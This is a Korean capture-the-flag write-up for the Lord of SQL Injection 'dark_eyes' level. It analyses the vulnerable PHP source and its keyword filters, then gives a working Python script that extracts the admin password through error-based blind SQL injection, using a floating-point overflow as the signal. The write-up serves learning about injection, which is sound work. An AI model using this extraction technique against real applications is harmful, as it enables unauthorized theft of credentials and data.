# Lord of SQL Injection No.22 - dark_eye

## 문제 출제 의도

Error return 코드 없이 Error based SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석
```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```
* preg_match 함수에서 pw의 문자열에서 `prob`,`_`,`.`,`()`,`col`,`if`,`case`,`when`,`sleep`,`benchmark`를 필터링한다.

* `if(mysql_error()) exit()`을 보니 error_code는 출력해주지 않는다.

* 입력한 pw의 값과 데이터베이스의 pw값이 일치해야 문제가 해결되는것을 보니 Blind SQL Injection임을 알 수 있다.

## 문제 해결 방안

* 지수 연산 최대치를 이용하여 문제를 해결한다.

* if문을 사용하면 안되므로 리턴값을 이용한 장난으로 풀어준다. 아래 소스코드의 주석에서 설명하겠다.

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
length = 0;
A = 1
while A >0:
    url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
    add_url = "' or id='admin' and (((length(pw)={})+1)*9e307)-- -".format(str(A))
    # length(pw)={}가 성립할경우 1을 리턴하므로 +1을 해주고 *9e307을 하게되면 9e307*2와 같은 역할을 하고 그는 지수연산 최대치를 가르키므로 오류가 발생한다. 그를 이용하여 문제를 풀어나간다.
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)

    re.add_header("User-Agent", "Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=ktfparn7mp86153smlme1jau10")

    res = urllib.request.urlopen(re)
    resA = res.read()
    if str(resA).find("query :") == -1: # error 코드를 반환해주지 않으므로 오류가 나지않으면 query : 가 나오므로 그것이 없을 때를 검사한다.
        length = A
        print("Length = {}".format(str(A)))
        break
    A=A+1 # length의 범위를 모르므로 while문으로 반복시키며 찾으면 break 해준다.
for i in range(1,A+1):
    for j in range(48,122):
        url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = "' or id='admin' and (((substr(pw,1,{})='{}')+1)*9e307)-- ;".format(str(i), result+chr(j))
        # 위의 while문과 같이 substr(pw,1,{})='{}'가 성립할경우 1를 리턴하기 때문에 (1+1)*9e307이므로 지수연산 최대치를 이용한다.
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ktfparn7mp86153smlme1jau10")

        res = urllib.request.urlopen(re)
        resB = res.read()
        if str(resB).find("query :") == -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break
print("Finished Searching.")
print("Password : " + result)
```

위의 코드를 실행 할 시에 5a2f5d3c를 출력해주므로 …?pw=5a2f5d3c를 하면 문제풀이에 성공한다.